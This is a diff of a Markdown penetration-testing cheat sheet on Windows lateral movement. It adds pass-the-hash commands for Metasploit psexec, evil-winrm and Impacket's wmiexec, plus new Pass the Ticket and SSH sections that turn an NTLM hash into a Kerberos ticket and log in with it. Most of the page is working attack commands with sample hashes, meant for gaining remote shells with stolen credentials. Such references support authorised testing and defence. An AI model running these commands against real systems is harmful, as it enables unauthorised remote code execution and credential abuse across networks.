@@ -7,8 +7,8 @@
     * [TIP 2 - Retail Credential](#tip-2-retail-credential)
     * [TIP 3 - Sandbox Credential - WDAGUtilityAccount](#tip-3-sandbox-credrential-wdagutilityaccount)
 * [Metasploit](#metasploit)
-    * [Metasploit - SMB](#metasploit-smb)
-    * [Metasploit - Psexec](#metasploit-psexec)
+    * [Metasploit - SMB](#metasploit---smb)
+    * [Metasploit - Psexec](#metasploit---psexec)
 * [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
 * [WinRM](#winrm)
 * [Powershell Remoting](#powershell-remoting)
@@ -20,6 +20,8 @@
 * [RDP Remote Desktop Protocol](#rdp-remote-desktop-protocol)
 * [Netuse](#netuse)
 * [Runas](#runas)
+* [Pass the Ticket](#pass-the-ticket)
+* [SSH](#ssh)
 
 ## TIPS
 
@@ -87,6 +89,7 @@ use exploit/windows/smb/psexec
 set RHOST 10.2.0.3
 set SMBUser username
 set SMBPass password
+set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
 set PAYLOAD windows/meterpreter/bind_tcp
 run
 shell
@@ -123,6 +126,7 @@ Require:
 root@payload$ git clone https://github.com/Hackplayers/evil-winrm
 root@payload$ evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
 root@payload$ evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
+root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79
 ```
 
 or using a custom ruby code to interact with the WinRM service.
@@ -190,7 +194,7 @@ PS C:\> wmic /node:target.domain /user:domain\user /password:password process ca
 
 ## Psexec.py / Smbexec.py / Wmiexec.py 
 
-from Impacket
+From [Impacket](https://github.com/SecureAuthCorp/impacket) (:warning: renamed to impacket-xxx in Kali)
 
 ```powershell
 root@payload$ git clone https://github.com/CoreSecurity/impacket.git
@@ -204,6 +208,8 @@ root@payload$ python smbexec.py DOMAIN/username:password@10.10.10.10
 
 # A semi-interactive shell, used through Windows Management Instrumentation. 
 root@payload$ python wmiexec.py DOMAIN/username:password@10.10.10.10
+root@payload$ wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
+
 
 # A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. 
 root@payload$ python atexec.py DOMAIN/username:password@10.10.10.10
@@ -289,6 +295,24 @@ PS C:\> runas /netonly /user:DOMAIN\username "cmd.exe"
 PS C:\> runas /noprofil /netonly /user:DOMAIN\username cmd.exe
 ```
 
+## Pass the Ticket
+
+```powershell
+python3 getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:B65039D1C0359FA797F88FF06296118F domain.local/user
+[*] Saving ticket in user.ccache
+cp user.ccache /tmp/krb5cc_0
+export KRB5CCNAME=/tmp/krb5cc_0
+klist
+```
+
+## SSH
+
+:warning: You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!
+
+```ps1
+cp user.ccache /tmp/krb5cc_1045
+ssh -o GSSAPIAuthentication=yes user@domain.local -vv
+```
 
 ## References
 
